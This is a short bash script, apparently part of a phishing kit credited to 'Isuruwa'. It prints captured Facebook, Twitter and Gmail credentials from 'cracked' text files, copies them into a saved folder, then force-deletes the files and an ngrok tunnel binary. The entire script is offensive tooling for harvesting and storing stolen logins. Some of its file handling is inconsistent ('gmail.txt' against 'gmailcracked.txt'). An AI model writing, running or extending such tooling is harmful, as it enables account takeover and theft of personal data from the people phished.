red='\033[1;31m'
rset='\033[0m'
grn='\033[1;32m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
clear
echo " "
echo " "
echo -e "$red------------$cyan[ Tool By {Isuruwa} ]$red------------$rset"
echo -e "\e[96m |---------------------------------------------------------------|"
ip=$(cat fbcracked.txt)
printf "\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] Facebook:\e[0m\e[1;92m $ip \e[0m\n" $ip
echo -e "\e[96m |---------------------------------------------------------------|"
ip=$(cat twcracked.txt)
printf "\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] Twitter:\e[0m\e[1;92m $ip \e[0m\n" $ip
echo -e "\e[96m |---------------------------------------------------------------|"
ip=$(cat gmailcracked.txt)
printf "\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] Gmail:\e[0m\e[1;92m $ip \e[0m\n" $ip
cp -f fbcracked.txt twcracked.txt gmail.txt $HOME/AIOP/source/saved/pubg
rm -rf fbcracked.txt twcracked.txt gmail.txt 
echo ""
echo ""
printf "         \e[1;92m\e[1;77m\e[0m\e[1;96m |\e[96m WAITING FOR DATA ,\e[0m\e[1;91m PRESS CTRL+C TO STOP \e[96m|\e[0m\n"
echo $'\cc' | rm -rf ngrok


